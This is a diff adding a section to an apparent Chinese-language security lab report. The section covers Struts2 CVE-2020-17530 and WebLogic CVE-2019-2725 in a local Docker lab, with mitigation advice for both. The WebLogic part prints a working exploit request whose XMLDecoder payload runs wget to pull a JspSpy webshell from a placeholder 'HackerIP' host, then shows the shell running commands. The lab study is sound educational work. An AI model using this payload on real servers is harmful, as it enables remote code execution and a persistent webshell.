@@ -21,6 +21,10 @@ Ani
     - [漏洞利用检测](#漏洞利用检测)
     - [漏洞利用缓解与修复](#漏洞利用缓解与修复) 
         - [漏洞利用防御与加固](#漏洞利用防御与加固)
+    - [场景化漏洞攻防](#场景化漏洞攻防)
+    - [Struts 2-CVE-2020-17530 漏洞](#struts-2-cve-2020-17530-漏洞缓解)
+    - [weblogic-CVE-2019-2725漏洞复现](#weblogic-cve-2019-2725-漏洞复现)
+    - [weblogic-CVE-2019-2725漏洞缓解与修复](#weblogic-cve-2019-2725-漏洞缓解与修复)
 - [参考资料](#参考资料)
 
 ---
@@ -33,6 +37,15 @@ Ani
   - 漏洞利用效果
   - 漏洞利用检测
   - 漏洞利用缓解与修复
+- 场景化漏洞攻防
+  - 场景搭建
+  - Struts 2-CVE-2020-17530 漏洞
+    - 漏洞修复
+  - weblogic-CVE-2019-2725 漏洞
+    - 漏洞存在性检验
+    - 漏洞可利用性
+    - 漏洞利用
+    - 漏洞缓解与修复
 
 ### 实验目的
 
@@ -713,8 +726,186 @@ tcpdump -i eth0 -w captured.pcap
 
 ![log4j2](img/log4j2attack.png)
 
+#### 场景化漏洞攻防
 
+#### 场景搭建
 
+创建两张网卡
+
+![wangka](img/wangka.png)
+
+并下载好需要的 3 种漏洞镜像：`struts2-cve-2020-17530、weblogic-cve-2019-2725、nginx-php-flag`
+
+![xiazai](img/xiazaijingxiang.png)
+
+在 `场景管理 -- 进行环境编排` 中搭建如下
+
+![dmz](img/dmz.png)
+
+搭建好后，保存并发布
+
+![dmz1](img/dmz1.png)
+
+在容器中启动场景
+
+![qidong](img/qidong3.png)
+
+`docker ps` 查看相应的镜像信息
+
+![dockerps](img/dockerps1.png)
+
+打开访问地址 `靶机IP + 端口号`
+
+![fangwen](img/fangwen.png)
+
+#### Struts 2-CVE-2020-17530 漏洞缓解
+
+##### 漏洞简介
+
+>`Apache Struts2` 框架是一个用于开发 `Java EE` 网络应用程序的 `Web` 框架。`Apache Struts` 于 2020 年 12 月 08 日披露 `S2-061` `Struts` 远程代码执行漏洞 (`CVE-2020-17530`) ，在使用某些 `tag` 等情况下可能存在 `OGNL` 表达式注入漏洞，从而造成远程代码执行风险极大
+
+>`Struts2 `会对某些标签属性(比如 `id`，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 `%{x}` 且 `x` 的值用户可控时，用户再传入一个 `%{payload}` 即可造成 OGNL 表达式执行。S2-061 是对 S2-059 沙盒进行的绕过
+
+##### 缓解措施
+
+影响版本 `apache:struts2 : 2.0.0 - 2.5.25`
+
+- 避免对不受信任的用户输入使用强制 `OGNL` 评估，升级到 [Struts 2.5.26 版本](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26
+)
+
+#### weblogic-CVE-2019-2725 漏洞复现
+
+##### 漏洞简介
+
+> `cve-2019-2725` 漏洞的核心利用点是 `weblogic` 的 `xmldecoder` 反序列化漏洞，攻击步骤就是将 `WAR` 包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 `HTTP` 请求，在未授权的情况下远程执行命令，获得目标服务器的权限
+
+#### weblogic 漏洞存在性检验
+
+启动镜像
+
+![qidong](img/qidong4.png)
+
+查看访问地址
+
+![wangzhi](img/wangzhi2.png)
+
+成功访问网址 `http://127.0.0.1:64371/_async/AsyncResponseService`
+
+漏洞存在
+
+![wangzhi](img/wangzhi3.png)
+
+#### weblogic 漏洞可利用性
+
+查看详细信息，访问 `http://127.0.0.1:64371/_async/AsyncResponseService?info`
+
+![info](img/info.png)
+
+#### weblogic 漏洞利用
+
+命令行输入下列命令开启简易 `http` 服务器
+
+```bash
+python3 -m http.server 8000
+```
+
+![fuwuqi](img/fuwuqi.png)
+
+使用 `burpsuite` 抓包，发送数据包，是服务端下载木马文件
+
+`burpsuite POC`
+
+```html
+POST /_async/AsyncResponseService HTTP/1.1
+Host: 127.0.0.1:64271
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+DNT: 1
+Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjM1MjA5NjEyLCJlbWFpbCI6IiJ9.cTSjCtV8thEmdfyP49gCsHldvX6KAAMjGQ209TCg0K8; JSESSIONID=050455BA3767B12181C6AA3E09AA3064
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 854
+SOAPAction:
+Accept: */*
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+Connection: keep-alive
+content-type: text/xml
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>wget http://HackerIP:8080/JspSpy.jsp.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/2.jsp</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
+```
+
+查看容器名
+
+![ps](img/ps2.png)
+
+进入容器
+
+```bash
+docker exec -it e28a76e23e5d bash
+```
+
+访问 `user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war` 文件夹，可以看到脚本 `2.jsp`
+
+![ls](img/ls2.png)
+
+访问脚本
+
+```bash
+http://127.0.0.1:64371/_async/2.jsp?pwd=023&i=ls
+```
+
+![jiaoben](img/jiaoben.png)
+
+### weblogic-CVE-2019-2725 漏洞缓解与修复
+
+受影响的 `Oracle WebLogic Server` 版本：`10.3.6.0`、`12.1.3.0`
+
+根据 [官方文档](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html?from=timeline) 缓解的措施主要有：
+
+- 下载官方的紧急补丁包
+
+- 升级本地 `JDK` 版本
+
+`Weblogic` 所采用的是安装文件中默认 1.6 版本的 `JDK` 文件，属于存在反序列化漏洞的 `JDK` 版本，升级到`JDK7u21` 以上版本可以避免由于 `Java` 原生类反序列化漏洞造成的远程代码执行
+
+- 配置 `URL` 访问控制策略
+
+部署于公网的 `WebLogic` 服务器，可通过 `ACL` 禁止对 `/_async/` 及 `/wls-wsat/` 路径的访问，修改访问控制策略，限制对 `/_async/及/wls-wsat/`路径的访问
+
+- 删除不安全文件
+
+删除 `wls9_async_response.war` 与 `wls-wsat.war` 文件及相关文件夹，并重启 `Weblogic` 服务。因为该漏洞由 `WAR` 包的缺陷引起，删除可以缓解。但 `wls9_async_response.war` 及 `wls-wsat.war` 属于一级应用包，对其进行移除或更名操作可能造成未知的后果，`Oracle` 官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到 `Oracle` 产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后，再执行此操作
+
+文件路径为：
+
+```bash
+\Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
+```
 
 ### 参考资料
 
@@ -737,6 +928,8 @@ tcpdump -i eth0 -w captured.pcap
 [Log4j2漏洞修复](https://blog.csdn.net/derstsea/article/details/121918902)
 
 [Wireshark 网络数据包角度看log4j](https://blog.csdn.net/weixin_47627078/article/details/122251204)
+
+[weblogic-CVE-2019-2725 漏洞复现](https://www.cnblogs.com/confidant/p/15464877.html)
 
 ---
 
